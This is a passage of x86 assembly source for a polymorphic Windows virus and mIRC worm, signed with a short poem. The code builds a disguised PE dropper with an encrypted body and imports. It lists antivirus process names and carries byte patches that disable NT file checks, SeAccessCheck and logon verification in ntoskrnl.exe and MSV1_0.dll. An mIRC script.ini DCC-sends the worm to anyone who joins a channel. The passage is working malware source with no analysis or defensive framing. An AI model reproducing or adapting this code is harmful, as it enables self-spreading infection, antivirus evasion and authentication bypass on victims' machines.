             or           eax,eax
             jz           AbortMirc

             mov          [MapHandle + X],eax

             push         00
             push         00
             push         00
             push         02
             push         dword ptr [MapHandle + X]
             call         MapViewOfFile

             or           eax,eax
             jz           MappingFailed

             mov          [MapBase + X],eax

;
; Fill the worm with blanks, to have a clean header
;

             mov          edi,eax
             pop          ecx
             xor          eax,eax
             repz         stosb

;
; calculate the worm entrypoint
;

             mov          edi,[MapBase + X]

             mov          esi,offset WormHeader - VS
             add          esi,ebp

             call         GetRandGarbage
             mov          [GarbageSize + X],eax

             add          eax,IDATSize
             add          eax,1100
             mov          [esi + 0A8],eax

;
; and the image size
;

             mov          eax,RawVSize
             add          eax,1000
             mov          [esi + 0D0],eax

;
; write the new header and the worm section
;

             mov          ecx,100
             repz         movsb

             add          edi,78
             mov          esi,offset WormSection - VS
             add          esi,ebp
             mov          ecx,28
             repz         movsb

             mov          ecx,260
             xor          al,al
             repz         stosb

;
; add the xtra garbage, which will be used by GetPolyRoutine
; to get the decryption keys
;

             mov          eax,100
             call         AddSomeGarbage

             mov          dword ptr [ImageBase + X],400000

             mov          dword ptr [Code_RVA + X],001000
             mov          dword ptr [Code_Offset + X],400
             mov          dword ptr [Code_Size + X],100

             mov          dword ptr [VirusAddress + X],401100
             mov          dword ptr [VirusOffset + X],500

             call         GetPolyRoutine

;
; setup the importations (otherwise GetProcAddress won't work)
;
; first write the function name (beep)
;

             mov          eax,edi
             mov          ebx,[MapBase + X]
             sub          eax,ebx
             add          eax,0C00
             push         eax
             push         eax

             mov          esi,offset ImportFunc - VS
             add          esi,ebp
             mov          ecx,7
             repz         movsb

             call         GetRandNb
             clc
             shr          eax,1A
             add          eax,4
             call         AddSomeGarbage

;
; write the dll name (kernel32)
;

             mov          eax,edi
             sub          eax,ebx
             add          eax,0C00
             mov          [DLL_RVA + X],eax

             mov          esi,offset ImportDll - VS
             add          esi,ebp
             mov          ecx,0Dh
             repz         movsb

             call         GetRandNb
             clc
             shr          eax,1A
             add          eax,4
             call         AddSomeGarbage

;
; make the image_import_by_name table
;

             mov          ecx,edi
             sub          ecx,ebx
             add          ecx,0C00

             pop          eax
             stosd

             xor          eax,eax
             stosd

;
; make the image import descriptor
;

             mov          esi,edi
             mov          eax,ecx
             stosd
             call         GetRandNb
             stosd
             call         GetRandNb
             stosd
             mov          eax,[DLL_RVA + X]
             stosd
             mov          eax,edi
             add          eax,18
             sub          eax,ebx
             add          eax,0C00
             stosd

             xor          eax,eax
             mov          ecx,5
             repz         stosd

;
; and make the 2nd image_import_by_name table, where the loader will
; put the kernel32 addresses. Strangely, WinNT requires that each element
; points to the function name
;

             pop          eax
             stosd
             xor          eax,eax
             stosd

;
; finally setup the import directory
;

             mov          eax,esi
             sub          eax,ebx
             add          eax,0C00
             mov          [ebx + 100],eax
             mov          dword ptr [ebx + 104],0100

             push         dword ptr [MapBase + X]
             call         UnmapViewOfFile

MappingFailed:

             push         dword ptr [MapHandle + X]
             call         _lclose

AbortMirc:

             push         dword ptr [FileHandle + X]
             call         _lclose
             ret


GetEIP:

             call         @1

@1:
             pop          ebp
             sub          ebp,offset @1 - offset VS

             ret



;
; At the moment, other API than the Kernel32 are not supported
;

Kernel32_API:


CreateFileMappingA:

             db           0B8
             dd           ?
             jmp          eax

             db           'CreateFileMappingA',0

CreateThread:

             db           0B8
             dd           ?
             jmp          eax

             db           'CreateThread',0

DeleteFileA:

             db           0B8
             dd           ?
             jmp          eax

             db           'DeleteFileA',0

DosDateTimeToFileTime:

             db           0B8
             dd           ?
             jmp          eax

             db           'DosDateTimeToFileTime',0

FindClose:

             db           0B8
             dd           ?
             jmp          eax

             db           'FindClose',0

FindFirstFileA:

             db           0B8
             dd           ?
             jmp          eax

             db           'FindFirstFileA',0

FindNextFileA:

             db           0B8
             dd           ?
             jmp          eax

             db           'FindNextFileA',0

GetCurrentDirectoryA:

             db           0B8
             dd           ?
             jmp          eax

             db           'GetCurrentDirectoryA',0

GetDriveTypeA:

             db           0B8
             dd           ?
             jmp          eax

             db           'GetDriveTypeA',0

GetFileSize:

             db           0B8
             dd           ?
             jmp          eax

             db           'GetFileSize',0

GetLocalTime:

             db           0B8
             dd           ?
             jmp          eax

             db           'GetLocalTime',0

GetTickCount:


             db           0B8
             dd           ?
             jmp          eax

             db           'GetTickCount',0

FileTimeToDosDateTime:


             db           0B8
             dd           ?
             jmp          eax

             db           'FileTimeToDosDateTime',0

MapViewOfFile:

             db           0B8
             dd           ?
             jmp          eax

             db           'MapViewOfFile',0

SetFileAttributesA:

             db           0B8
             dd           ?
             jmp          eax

             db           'SetFileAttributesA',0

SetFileTime:

             db           0B8
             dd           ?
             jmp          eax

             db           'SetFileTime',0

VirtualAlloc:

             db           0B8
             dd           ?
             jmp          eax

             db           'VirtualAlloc',0

VirtualFree:

             db           0B8
             dd           ?
             jmp          eax

             db           'VirtualFree',0

UnmapViewOfFile:

             db           0B8
             dd           ?
             jmp          eax

             db           'UnmapViewOfFile',0

_lcreat:

             db           0B8
             dd           ?
             jmp          eax

             db           '_lcreat',0

_llseek:

             db           0B8
             dd           ?
             jmp          eax

             db           '_llseek',0

_lopen:

             db           0B8
             dd           ?
             jmp          eax

             db           '_lopen',0

_lread:

             db           0B8
             dd           ?
             jmp          eax

             db           '_lread',0

_lclose:

             db           0B8
             dd           ?
             jmp          eax

             db           '_lclose',0

_lwrite:

             db           0B8
             dd           ?
             jmp          eax

             db           '_lwrite',0


AV_Names     db           'avp','aler','amon','avp3','avpm','n32s'
             db           'nava','navl','navr','navw','nod3','npss'
             db           'nsch','nspl','scan','smss'
             dd           0

W9x_GPA_Key  db           0C2,04,00,57,6A,22,2Bh,0D2

WNT_GPA_Key  db           0C2,04,00,55,8Bh,4C,24,0C

RMul         dd           07FFFFD9h

RDiv         dd           0FFFFFFFBh

NTLDR        db           ?,':\NTLDR',0

NTOSKRNL     db           ?,':\WINNT\system32\ntoskrnl.exe',0

MSV1_0       db           ?,':\WINNT\system32\MSV1_0.dll',0

OldFileCheck db           3Bh,46,58,74,07

OldSeAccessC db           8A,0C3,5F,5E,5Bh,5Dh,0C2,28,00

OldWriteFile db           0C,02,85,45,0C0,75,12

OldLogonTest db           84,0C0,75,26,33,0C0

NewFileCheck db           3Bh,46,58,0EBh,07

NewSeAccessC db           0B0,01,5F,5E,5Bh,5Dh,0C2,28,00

NewWriteFile db           0C,02,85,45,0C0,0EBh,12

NewLogonTest db           84,0C0,0EBh,26,33,0C0

CookiesDir1  db           '\WINDOWS\Cookies\*.*',0

CookiesDir2  db           '\WINNT\Cookies\*.*',0

MircWormFlag db           01

ScriptName   db           ?,':\mirc\script.ini',0

RandLetters  db           'awixkervtoslnehd'

MircScript   db           '[script]',0Dh,0A
             db           'n0=on 1:JOIN:#:{',0Dh,0A
             db           'n1=if ($nick != $me) {',0Dh,0A
             db           'n2=    /dcc send $nick '
MircName     db           ?,':\mirc\',?,?,?,?,?,'.exe',0Dh,0A
             db           'n3=  }',0Dh,0A
             db           'n4=}',0Dh,0A

MircEnd:


WormHeader   db           4Dh,5A, 90, 00, 03, 00, 00, 00,  04, 00, 00, 00,0FF,0FF, 00, 00
             db          0B8, 00, 00, 00, 00, 00, 00, 00,  40, 00, 00, 00, 00, 00, 00, 00
             db           00, 00, 00, 00, 00, 00, 00, 00,  00, 00, 00, 00, 00, 00, 00, 00
             db           00, 00, 00, 00, 00, 00, 00, 00,  00, 00, 00, 00, 80, 00, 00, 00
             db           0E, 1F,0BA, 0E, 00,0B4, 09,0CDh, 21,0B8, 01, 4C,0CDh,21, 54, 68
             db           69, 73, 20, 70, 72, 6F, 67, 72,  61, 6Dh,20, 63, 61, 6E, 6E, 6F
             db           74, 20, 62, 65, 20, 72, 75, 6E,  20, 69, 6E, 20, 44, 4F, 53, 20
             db           6Dh,6F, 64, 65, 2E, 0Dh,0Dh,0A,  24, 00, 00, 00, 00, 00, 00, 00
             db           50, 45, 00, 00, 4C, 01, 01, 00,  00, 00, 00, 00, 00, 00, 00, 00
             db           00, 00, 00, 00,0E0, 00, 0E, 01,  0Bh,01, 03, 0A, 00, 00, 00, 00
             db           00, 00, 00, 00, 00, 00, 00, 00,  00, 00, 00, 00, 00, 00, 00, 00
             db           00, 00, 00, 00, 00, 00, 40, 00,  00, 10, 00, 00, 00, 02, 00, 00
             db           04, 00, 00, 00, 00, 00, 00, 00,  04, 00, 00, 00, 00, 00, 00, 00
             db           00, 00, 00, 00, 00, 04, 00, 00,  00, 00, 00, 00, 02, 00, 00, 00
             db           00, 00, 10, 00, 00, 10, 00, 00,  00, 00, 10, 00, 00, 10, 00, 00
             db           00, 00, 00, 00, 10, 00, 00, 00,  00, 00, 00, 00, 00, 00, 00, 00


WormSection  db           '.text',0,0,0
             dd           RawVSize                  ; Virual Size
             dd           00001000h                 ; RVA
             dd           ?                         ; Physical Size
             dd           00000400h                 ; Offset
             db           0C dup (?)
             dd           0C0000020h

;
; Hooker contains the polymorphic routine address
;

Hooker       dd           ?

;
; The HostCalls has this structure :
;
;     item 1 - address of the 1st call hooked by the virus
;            - the original value of the call (where ExitVS jumps);
;
;     item 2 : same
;     item 3 : same
;            
;         ....
;



HostCalls    dd           NbHooks * 2 dup (?)


ImportFunc   db           ?,?,'Beep',0

ImportDll    db           'kernel32.dll',0


ALIGN        4


;
; the initialized code & data of the virus end here
;


EndOfCode:


;
; leave a little room for the garbage and the polymorphic routine
;


             db           200 dup (?)


RandNb       dd           ?

K32_Base     dd           ?

ThreadID     dd           ?

SearchHandle dd           ?

CDirEnd      dd           ?

FileHandle   dd           ?

MapHandle    dd           ?

MapBase      dd           ?

FileDate     dw           ?

FileTime     dw           ?

SelF         db           ?

B1A          dd           ?

B2A          dd           ?

FBA          dd           ?

BytesRead    dd           ?

GarbageSize  dd           ?

BlankSize    dd           ?

ImageBase    dd           ?

VirusOffset  dd           ?

VirusAddress dd           ?

VStart       dd           ?

LoopStart    dd           ?

Code_Offset  dd           ?

Code_Size    dd           ?

Code_RVA     dd           ?

Code_Loc     dd           ?

LastSSize    dd           ?

FileSize     dd           ?

Key1_Addr    dd           ?

Key2_Addr    dd           ?

Key3         db           ?

Reg32_A      db           ?

Reg32_B      db           ?

Reg32_C      db           ?

AsOpCode     db           ?

RlModRM      db           ?

DLL_RVA      dd           ?


_Filename    dd           ?

Signature    dd           ?

Patch        dd           ?

PatchSize    dd           ?


Somewhere    dd           NbHooks * 2 dup (?)


CurrentDir   db           100 dup (1)


Buffer1      db           100 dup (2)


Buffer2      db           200 dup (3)


EndOfVirus:


IDATSize     equ          offset EndOfCode - offset VS

VSIZE        equ          offset EndOfVirus - offset VS

RawVSize     equ          VSIZE - (VSIZE mod 1000) + 1000



VIRUS        ENDS


END          MAIN



















































;          Up above the world you fly,
;          Like a tea-tray in the sky.
;          Twinkle, twinkle -
;
;                             L.C.




